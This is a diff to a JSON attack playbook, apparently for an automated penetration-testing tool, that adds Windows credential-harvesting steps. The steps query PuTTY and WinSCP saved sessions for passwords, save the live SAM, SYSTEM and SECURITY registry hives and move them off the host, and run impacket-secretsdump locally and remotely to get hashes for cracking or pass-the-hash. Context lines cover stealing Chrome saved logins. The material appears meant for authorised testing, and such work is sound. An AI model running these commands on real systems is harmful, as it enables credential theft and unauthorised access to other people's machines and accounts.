@@ -363,7 +363,40 @@
      "tool": "sh",
      "run": "dir %APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login* 2>nul",
      "note": "Browser vaults are DPAPI-protected — recover them with SharpChrome, or copy Login Data plus the Local State key and crack them offline."
+    },
+    {
+     "tool": "sh",
+     "run": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s",
+     "note": "PuTTY saved sessions store secrets in cleartext: a ProxyPassword/ProxyUsername pair, or a full plink command line with -pw '<pass>' <user>@<host>. obol extracts the credential straight from this output."
+    },
+    {
+     "tool": "sh",
+     "run": "reg query \"HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\" /s 2>nul",
+     "note": "WinSCP stores session passwords obfuscated (not cleartext) — flag them, then recover with a WinSCP password decoder / winscppasswd."
     }
+   ]
+  },
+  {
+   "id": "windows-old-hives",
+   "title": "windows.old / Registry-Hive Secret Dump",
+   "hypothesis": "A leftover C:\\windows.old (from an in-place upgrade) or a saved SAM/SYSTEM/SECURITY hive holds old local-account hashes — often a still-valid Administrator hash you can crack or pass-the-hash. With a foothold, pull or save the hives and run secretsdump offline.",
+   "tool": "impacket-secretsdump",
+   "tools": ["impacket-secretsdump", "reg"],
+   "os": ["windows"],
+   "requires_all": [],
+   "requires_any": ["foothold.windows", "access.shell", "access.system"],
+   "produces": ["credential.candidate", "hash.ntlm", "loot.files"],
+   "priority": 82,
+   "autonomy": "approve",
+   "proves": "local-account NTLM hashes recovered from windows.old or saved registry hives (SAM + SYSTEM [+ SECURITY])",
+   "does_not_prove": "a validated login — a recovered hash must still be cracked or passed against a live service to prove access",
+   "report": {"finding": "Credential Exposure via windows.old / Backup Registry Hives", "severity": "high"},
+   "refs": ["https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg"],
+   "commands": [
+    {"tool": "sh", "run": "dir /a C:\\ | findstr /i windows.old & dir C:\\windows.old\\Windows\\System32\\config\\", "note": "Look for a leftover windows.old tree — the old SAM/SYSTEM/SECURITY live under ...\\Windows\\System32\\config."},
+    {"tool": "reg", "run": "reg save HKLM\\SAM %TEMP%\\SAM.hive & reg save HKLM\\SYSTEM %TEMP%\\SYSTEM.hive & reg save HKLM\\SECURITY %TEMP%\\SECURITY.hive", "note": "Or, once you hold the box (local admin/SYSTEM), save the LIVE hives, then exfil the three files to Kali."},
+    {"tool": "impacket-secretsdump", "run": "impacket-secretsdump -sam SAM.hive -system SYSTEM.hive -security SECURITY.hive LOCAL", "note": "Parse offline on Kali. Crack or pass-the-hash the recovered Administrator hash, then paste the result on Evidence."},
+    {"tool": "impacket-secretsdump", "run": "impacket-secretsdump {{domain}}/{{user}}:'{{password}}'@{{target}}", "note": "Or dump remotely when you already hold admin creds on the box."}
    ]
   },
   {
